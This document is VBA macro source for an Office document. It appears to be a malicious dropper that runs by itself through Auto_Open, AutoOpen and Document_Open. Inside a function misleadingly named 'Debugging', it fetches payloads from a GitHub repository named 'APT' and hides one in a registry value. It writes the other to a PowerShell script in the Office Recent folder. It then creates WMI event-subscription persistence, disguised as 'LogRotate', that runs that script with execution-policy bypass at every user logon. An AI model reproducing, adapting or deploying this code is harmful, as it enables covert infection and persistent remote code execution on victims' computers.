Public Runs As Boolean
Sub Auto_Open()
    
    Call Debugging
    
End Sub
Sub AutoOpen()

    Call Debugging

End Sub
Sub Document_Open()

    Call Debugging

End Sub
Private Function WMIPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    Dim filterName, consumerName As String
    Dim objLocator, objService1
    Dim objInstances1, objInstances2, objInstances3
    Dim newObj1, newObj2, newObj3
    
    On Error GoTo Failed
    
    filterName = taskName & " Event"
    consumerName = taskName & " Consumer"
    
    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objService1 = objLocator.ConnectServer(".", "root\subscription")

    Set objInstances1 = objService1.Get("__EventFilter")

    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"

    Set newObj1 = objInstances1.Spawninstance_
    newObj1.Name = filterName
    newObj1.eventNamespace = "root\cimv2"
    newObj1.QueryLanguage = "WQL"
    newObj1.Query = Query
    newObj1.Put_
    
    Set objInstances2 = objService1.Get("CommandLineEventConsumer")
    Set newObj2 = objInstances2.Spawninstance_
    newObj2.Name = consumerName
    newObj2.CommandLineTemplate = exePath
    newObj2.Put_
    
    Set objInstances3 = objService1.Get("__FilterToConsumerBinding")
    Set newObj3 = objInstances3.Spawninstance_
    newObj3.Filter = "__EventFilter.Name=""" & filterName & """"
    newObj3.Consumer = "CommandLineEventConsumer.Name=""" & consumerName & """"
    newObj3.Put_
    
    WMIPersistence = True
    Exit Function
Failed:
    WMIPersistence = False

End Function
Private Function RegPayload(ByVal RegPath As String, ByVal RegValue As String) As Boolean
    
    Set wshShell = CreateObject("WScript.Shell")
    wshShell.regwrite RegPath, RegValue, "REG_SZ"
    
    On Error GoTo Failed
    RegPayload = True
    Exit Function
Failed:
    RegPayload = False
    
End Function
Private Function FilePayload(ByVal FileFullPath As String, ByVal ADSName As String, ByVal Payload As String)

    Dim fileSysObj
    Set fileSysObj = CreateObject("Scripting.FileSystemObject")
    Set fileObj = fileSysObj.CreateTextFile(FileFullPath)
    fileObj.WriteLine Payload
    fileObj.Close

End Function
Private Function HTTPClient(ByVal xUrl As String) As String
    Dim State As Integer
    Dim ie As Object
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Navigate xUrl
    State = 0
    Do Until State = 4
       DoEvents: State = ie.readyState
    Loop
    On Error GoTo Failed
    HTTPClient = ie.Document.Body.InnerText
    Exit Function
Failed:
    HTTPClient = False

End Function
Private Function Debugging() As Boolean
    
    If Runs = True Then GoTo Failed
    
    Dim Str, CurrentUserSid, PayloadConsumer, xrUrl, xfUrl, xRegKey, xFileFullPath, xFilePath, xFileName, xADSName As String
    xrUrl = "https://raw.githubusercontent.com/xia33F/APT/master/payloads/master_page"
    xfUrl = "https://raw.githubusercontent.com/xia33F/APT/master/payloads/wrapper_page"
    xFilePath = Environ("APPDATA") & "\Microsoft\Office\Recent\"
    xFileName = "tmpA7Z2.ps1"
    xFileFullPath = xFilePath & xFileName
    xADSName = "secret.txt"
    xRegKey = "HKEY_USERS\S-1-5-21-3921924719-2751751025-4067464375-1003\Software\RegisteredApplications\AppXs42fd12c3po92dynnq2r142fs12qhvsmyy"
    
    PayloadConsumer = "powershell.exe -noP -ep bypass iex -c ""('" & xFileFullPath & "')"""
    
    Call RegPayload(xRegKey, HTTPClient(xrUrl))
    Call FilePayload(xFileFullPath, xADSName, HTTPClient(xfUrl))
    Call WMIPersistence(PayloadConsumer, "LogRotate")
    
    On Error GoTo Failed
    Debugging = True
    Runs = True
    Exit Function
Failed:
    Debugging = False

End Function


